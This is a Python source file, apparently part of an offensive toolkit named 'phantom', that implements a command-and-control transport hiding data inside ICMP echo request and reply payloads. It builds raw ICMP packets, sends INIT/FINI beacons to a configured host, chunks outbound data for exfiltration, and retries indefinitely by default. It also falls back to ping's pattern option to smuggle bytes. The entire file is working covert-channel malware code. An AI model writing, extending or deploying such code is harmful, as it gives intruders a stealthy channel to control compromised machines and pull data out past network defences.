"""ICMP tunneling transport — data in echo request/reply payloads.

Requires root/admin for raw sockets.  Falls back to subprocess ping
with data embedded in padding bytes if raw sockets are unavailable.

ICMP Echo Request packet layout:
  Type(1) = 8 | Code(1) = 0 | Checksum(2) | Identifier(2) | Sequence(2) | Payload(variable)

ICMP Echo Reply packet layout:
  Type(1) = 0 | Code(1) = 0 | Checksum(2) | Identifier(2) | Sequence(2) | Payload(variable)
"""

import logging
import os
import select
import socket
import struct
import subprocess
import threading
import time

log = logging.getLogger("phantom.transport.icmp")

# ICMP type constants
_ICMP_ECHO_REQUEST = 8
_ICMP_ECHO_REPLY = 0

# Max payload per ICMP packet (keep it reasonable to avoid fragmentation)
_MAX_ICMP_PAYLOAD = 512

# Magic marker at the start of every payload for filtering stray replies
_MAGIC = b"\xc2\x50\x48"


def _checksum(data: bytes) -> int:
    """Compute Internet Checksum per RFC 1071.

    Sum all 16-bit words, fold carry bits, return one's complement.
    """
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    # Fold 32-bit sum into 16 bits
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def _build_icmp_echo(icmp_id: int, seq: int, payload: bytes) -> bytes:
    """Build an ICMP Echo Request packet.

    Header: Type(1) Code(1) Checksum(2) ID(2) Seq(2)
    Checksum is computed with the field initially zeroed.
    """
    header = struct.pack(">BBHHH", _ICMP_ECHO_REQUEST, 0, 0, icmp_id, seq)
    packet = header + payload
    chksum = _checksum(packet)
    # Re-pack with correct checksum
    header = struct.pack(">BBHHH", _ICMP_ECHO_REQUEST, 0, chksum, icmp_id, seq)
    return header + payload


def _parse_icmp_reply(data: bytes, expected_id: int) -> tuple[int, bytes] | None:
    """Parse an ICMP Echo Reply and extract (sequence, payload).

    Raw socket receives the full IP packet; IP header is typically 20 bytes.
    We skip the IP header, then parse the ICMP header.
    """
    if len(data) < 28:
        return None

    # IP header length from IHL field (lower 4 bits of first byte)
    ip_header_len = (data[0] & 0x0F) * 4
    icmp_data = data[ip_header_len:]

    if len(icmp_data) < 8:
        return None

    icmp_type, code, chksum, icmp_id, seq = struct.unpack(">BBHHH", icmp_data[:8])

    if icmp_type != _ICMP_ECHO_REPLY:
        return None
    if icmp_id != expected_id:
        return None

    payload = icmp_data[8:]

    # Verify magic marker
    if not payload.startswith(_MAGIC):
        return None

    return seq, payload[len(_MAGIC):]


class IcmpTransport:
    """C2 transport over ICMP — tunnels data in echo request/reply payloads.

    Outbound data is chunked and sent as ICMP Echo Requests with payloads.
    Inbound data arrives in ICMP Echo Replies with matching identifier.
    Requires root privileges for raw sockets.
    """

    _MAX_PAYLOAD = _MAX_ICMP_PAYLOAD - len(_MAGIC)

    def __init__(self, host: str, icmp_id: int | None = None,
                 timeout: float = 5.0, retry_count: int = -1,
                 retry_delay: float = 10.0):
        self.host = host
        self.icmp_id = icmp_id if icmp_id is not None else (os.getpid() & 0xFFFF)
        self.timeout = timeout
        self.retry_count = retry_count
        self.retry_delay = retry_delay
        self._sock: socket.socket | None = None
        self._connected = False
        self._seq = 0
        self._seq_lock = threading.Lock()
        self._use_raw = True
        self._resolved_host: str | None = None

    @property
    def connected(self) -> bool:
        return self._connected

    def _next_seq(self) -> int:
        with self._seq_lock:
            s = self._seq & 0xFFFF
            self._seq += 1
            return s

    def _create_raw_socket(self) -> socket.socket:
        """Create a raw ICMP socket (requires CAP_NET_RAW or root)."""
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.settimeout(self.timeout)
        return s

    def _resolve_host(self) -> str:
        """Resolve hostname to IP address."""
        return socket.gethostbyname(self.host)

    def _send_icmp(self, payload: bytes) -> bool:
        """Send a single ICMP Echo Request with the given payload."""
        seq = self._next_seq()
        marked_payload = _MAGIC + payload
        packet = _build_icmp_echo(self.icmp_id, seq, marked_payload)

        if self._use_raw and self._sock:
            try:
                self._sock.sendto(packet, (self._resolved_host, 0))
                return True
            except OSError as e:
                log.error(f"ICMP send failed: {e}")
                return False
        else:
            return self._send_via_ping(payload)

    def _send_via_ping(self, payload: bytes) -> bool:
        """Fallback: use subprocess ping with data in padding.

        This is a degraded mode — only sends data, cannot reliably
        receive custom payloads back.
        """
        try:
            hex_data = payload.hex()
            # Use ping -p (pattern) to embed a few bytes of data
            cmd = ["ping", "-c", "1", "-W", "2", "-p", hex_data[:32], self.host]
            subprocess.run(cmd, capture_output=True, timeout=5)
            return True
        except Exception as e:
            log.warning(f"Ping fallback failed: {e}")
            return False

    def _recv_icmp(self, timeout: float | None = None) -> bytes | None:
        """Receive a single ICMP Echo Reply matching our identifier."""
        if not self._use_raw or not self._sock:
            return None

        deadline = time.monotonic() + (timeout or self.timeout)
        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            try:
                ready = select.select([self._sock], [], [], min(remaining, 1.0))
                if not ready[0]:
                    continue
                data, addr = self._sock.recvfrom(65535)
                result = _parse_icmp_reply(data, self.icmp_id)
                if result is not None:
                    return result[1]
            except socket.timeout:
                continue
            except OSError as e:
                log.warning(f"ICMP recv error: {e}")
                return None
        return None

    def connect(self) -> bool:
        attempts = 0
        while self.retry_count == -1 or attempts < self.retry_count:
            try:
                self._resolved_host = self._resolve_host()

                # Try raw socket first
                try:
                    self._sock = self._create_raw_socket()
                    self._use_raw = True
                    log.debug("Using raw ICMP socket")
                except PermissionError:
                    log.warning("Raw socket unavailable (need root), "
                                "falling back to ping subprocess")
                    self._use_raw = False
                except OSError as e:
                    log.warning(f"Raw socket error: {e}, falling back to ping")
                    self._use_raw = False

                # Send initial beacon
                beacon = struct.pack(">4sH", b"INIT", self.icmp_id)
                if self._send_icmp(beacon):
                    if self._use_raw:
                        reply = self._recv_icmp(timeout=self.timeout)
                        if reply is not None:
                            self._connected = True
                            log.info(f"ICMP transport connected to {self.host}")
                            return True
                    else:
                        # In fallback mode, assume connection succeeded
                        self._connected = True
                        log.info(f"ICMP transport connected (fallback) to {self.host}")
                        return True

            except Exception as e:
                log.warning(f"ICMP connect failed: {e}")

            attempts += 1
            if self.retry_count != -1 and attempts >= self.retry_count:
                return False
            time.sleep(self.retry_delay)
        return False

    def send(self, data: bytes) -> bool:
        """Chunk and send data as ICMP Echo Request payloads."""
        if not self._connected:
            return False

        chunks = [data[i:i + self._MAX_PAYLOAD]
                  for i in range(0, len(data), self._MAX_PAYLOAD)]
        total = len(chunks)

        # Header chunk: total count so receiver knows how many to expect
        header = struct.pack(">BH", 0x01, total)
        if not self._send_icmp(header):
            return False

        for idx, chunk in enumerate(chunks):
            # Prefix each chunk with index for reassembly
            chunk_header = struct.pack(">HH", idx, total)
            if not self._send_icmp(chunk_header + chunk):
                log.error(f"Failed to send ICMP chunk {idx}/{total}")
                return False
            # Small delay between packets to avoid ICMP rate limiting
            time.sleep(0.05)

        return True

    def recv(self) -> bytes | None:
        """Listen for ICMP Echo Replies and reassemble chunked data."""
        if not self._connected or not self._use_raw:
            return None

        # First, receive the header packet with total chunk count
        header_data = self._recv_icmp()
        if not header_data or len(header_data) < 3:
            return None

        marker = header_data[0]
        if marker != 0x01:
            # Single-packet response (no chunking header)
            return header_data

        total = struct.unpack(">H", header_data[1:3])[0]
        if total == 0:
            return None

        chunks: dict[int, bytes] = {}
        deadline = time.monotonic() + self.timeout * total

        while len(chunks) < total and time.monotonic() < deadline:
            data = self._recv_icmp(timeout=2.0)
            if data and len(data) >= 4:
                idx, _ = struct.unpack(">HH", data[:4])
                chunks[idx] = data[4:]

        if len(chunks) != total:
            log.warning(f"Incomplete ICMP response: got {len(chunks)}/{total} chunks")
            return None

        return b"".join(chunks[i] for i in range(total))

    def disconnect(self):
        if self._connected:
            try:
                fin = struct.pack(">4sH", b"FINI", self.icmp_id)
                self._send_icmp(fin)
            except Exception:
                pass
        self._cleanup()
        log.info("ICMP transport disconnected")

    def _cleanup(self):
        self._connected = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
